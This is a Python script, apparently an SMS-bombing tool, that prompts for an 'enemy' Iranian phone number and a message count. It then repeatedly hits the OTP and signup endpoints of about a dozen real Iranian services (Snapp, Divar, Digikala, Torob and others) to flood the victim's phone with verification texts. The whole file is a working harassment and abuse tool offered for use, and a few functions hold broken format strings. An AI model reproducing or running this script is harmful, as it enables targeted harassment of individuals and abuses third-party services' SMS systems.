
from requests import post , get
from time import sleep
from os import system , name
import os
import colorama
import time
from colorama import Fore
def logo() :
    os.system("cls")
    print(color.BLUE+"""
 
\n
        ______  _____ ______
   /\  |  ___ \(_____|_____ \ 
  /  \ | | _ | |  _   _____) )
 / /\ \| || || | | | (_____ ( 
| |__| | || || |_| |_      | |
|______|_||_||_(_____)     |_|
     
          amirpink                     
 ______ _____ ______  _    _  
(_____ (_____)  ___ \| |  / ) 
 _____) ) _  | |   | | | / /  
|  ____/ | | | |   | | |< <   
| |     _| |_| |   | | | \ \  
|_|    (_____)_|   |_|_|  \_) 
                              
"""+color.BLUE)
    print(colorama.Fore.WHITE+"|----------------------|>")
    print(Fore.WHITE+"|"+ Fore.MAGENTA+ "   creat by"+Fore.WHITE+ "amirpink     |>")
    print(Fore.WHITE+"|"+ Fore.MAGENTA+ " rubika id :"+Fore.WHITE+ "@amirpink |>")
    print(Fore.WHITE+"|"+ Fore.MAGENTA+ "telegram id :"+Fore.WHITE+ "@bombback  |>")
    print("|----------------------|>")
    print(colorama.Fore.WHITE+"|"+colorama.Fore.MAGENTA+"    github :"+colorama.Fore.WHITE+"amirpink"    "    |>")
    print("|----------------------|>")
    print(f"{colorama.Fore.MAGENTA}")
    print(f"{colorama.Fore.GREEN}Waiting 2 sec ...")
    time.sleep(1)


class color: 
    BLUE = '\033[94m'
    RED = '\033[91m'


def clear():
    if name == 'nt':
        _ = system('cls')
    
    else:
        _ = system('clear')







sended = []

def log(looping_count, sms_number, phone_number):
    clear()
    logo()

    return_200 = str(sended.count(1))
    return_error = str(sended.count(0))
    return_internet_error = str(sended.count(-1))

    print("----------------------------------------------------")
    print("[-] target : 98 {}".format(phone_number))
    print("\n\n[*] send: {}/{}    site error: {}    internet error: {}".format(return_200, sms_number, return_error, return_internet_error))
    print("\n[*] all lo0ping script : {}".format(looping_count))
    print("----------------------------------------------------")


 
def start():
    looping_count = 0

    clear()
    logo()
    print("\n\n")
    phone_number = str(input(colorama.Fore.GREEN+"[+]"+colorama.Fore.RESET+ "Enter Your Enemy number:\n>>+98 "))
    sms_number = int(input(colorama.Fore.GREEN+"[+]"+colorama.Fore.RESET+ " Number of sms:\n>>"))

    while looping_count <= sms_number:

        if sended.count(1) >= sms_number:
            clear()
            log(looping_count, sms_number, phone_number)
            print("\n[ ] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
            break
        
        else:
            log(looping_count, sms_number, phone_number)

            looping_count = looping_count + 1
            
            snap(phone_number)
            sleep(0)
            tamland(phone_number)
            sleep(0)
            alibaba(phone_number)
            sleep(0)
            tapsi(phone_number)
            sleep(0)
            divar(phone_number)
            sleep(0)
            sbm24(phone_number)
            sleep(0)
            anten(phone_number)
            sleep(0)
            sheypoor(phone_number)
            sleep(0)
            togmond(phone_number)
            sleep(0)
            torob(phone_number)
            sleep(0)
            limited_sites(phone_number)
            sleep(0)
            snap_room(phone_number)
            dijikala(phone_number)
            sleep(0)
            
            


# 001 snap
def snap(phone_number):
    try:
        phone_number = "+98" + phone_number
        data = {"cellphone":phone_number}
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print(colorama.Fore.WHITE+"[snap]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
            
        else:
            print(colorama.Fore.WHITE+"[-snap]"+colorama.Fore.RED+ " not send , error code:{}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-snap]"+colorama.Fore.RED+ " not send check internet or somting..")
        sended.append(-1)
        

#001 famiran
def tamland(phone_number):
    try:
        phone_number = "0" + phone_number
        

        data = {"Mobile":phone_number,"SchoolId":-1}
        url = "https://api.famiran.com/api/user/signup"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print(colorama.Fore.WHITE+"[tamland"+colorama.Fore.GREEN+ " send post and : {}".format(p))
            
        else:
            print(colorama.Fore.WHITE+"[-tamland]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-tamland]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)
        

#003 alibaba
def alibaba(phone_number):
    try:
        phone_number = phone_number
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        data = {"phoneNumber":phone_number}
        p = post(url, json=data, timeout=3)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print(colorama.Fore.WHITE+"[alibaba]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
            
        else: 
            print(colorama.Fore.WHITE+"[-alibaba]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-alibaba]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)

# 004 tapsi -limit
def tapsi(phone_number):
    try:
        phone_number = "0" + phone_number
        data = {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"}}
        url = "https://tap33.me/api/v2/user"
        p = post(url, json=data, timeout=2 )
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[tapsi]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-tapsi]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-tapsi]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)

# 005 divar
def divar(phone_number):
    try:
        phone_number = phone_number
        data = {"phone":phone_number}
        url = "https://api.divar.ir/v5/auth/authenticate"
        p = post(url, json=data, timeout=2)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[divar]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-divar]"+colorama.Fore.RED+ "not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-divar]"+colorama.Fore.YELLOW+ "not send check internet or somting..")
        sended.append(-1)


# 006 sbm24 -limit
def sbm24(phone_number):
    try:
        data = {}
        url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[sbm24]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-sbm24]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-sbm24]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)



# 007 snap market
def snap_market(phone_number):
    try:

        data = {}
        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{}&dummy=1603885783456".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[+snap_market]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-snap_market]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-snap_market]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)



# 008 anten *
def anten(phone_number):
    try:
        phone_number = '0'+phone_number
        data = {"phone":phone_number}
        url = "https://api2.anten.ir/users/"
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[+anten]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-anten]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-anten]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)


# 009 sheypoor *
def sheypoor(phone_number):
    try:
        data = {"username":"0"+phone_number}    
        url = "https://www.sheypoor.com/api/v10.0.0/auth/send"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[+sheypoor]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-sheypoor]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-sheypoor]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)


# 010 togmond *
def togmond(phone_number):
    try:
        phone_number = phone_number
        data = "phone_number=0".format(phone_number)
        url = "https://tagmond.com/phone_number"
        p = post(url, data=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(2) # for 10 try : dont send sms bot return 200!
            print(colorama.Fore.WHITE+"[+togmond]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-togmond]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-togmond]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)


# 011 torob
def torob(phone_number):
    try:
        url = "https://api.torob.com/a/phone/send-pin/?phone_number=0{}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[+torob]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-torob]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-torob]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)


# 012 lomited sites
def limited_sites(phone_number):
    try:
        data = {"username":phone_number}     
        url = "https://www.tebinja.com/api/v1/users"
        post(url, json=data, timeout=1)
        sleep(.01)
    except:
        sended.append(2)
    
# 013 snap room
def snap_room(phone_number):
    try:
        data = {"username":"0"+phone_number}    
        url = "https://napi.snapproom.com/users/self/verification-flow"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[+snap room]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-snap room]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-snap room]"+colorama.Fore.YELLOW+ " not send check internet or somting..")
        sended.append(-1)

#014dijikala
def dijikala(phone_number):
    try:
        data = {"username":"0"+phone_number}    
        url = "https://api.digikala.com/v1/user/authenticate/"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print(colorama.Fore.WHITE+"[+dijikala]"+colorama.Fore.GREEN+ " send post and : {}".format(p))
        else:
            print(colorama.Fore.WHITE+"[-dijikala]"+colorama.Fore.RED+ " not send , error code: {}".format(p))
            sended.append(0)
    except:
        print(colorama.Fore.WHITE+"[-dijikala]"+colorama.Fore.WHITE+ " not send check internet or somting..")
        sended.append(-1)

site_function = 14


if __name__ == "__main__":
    start()







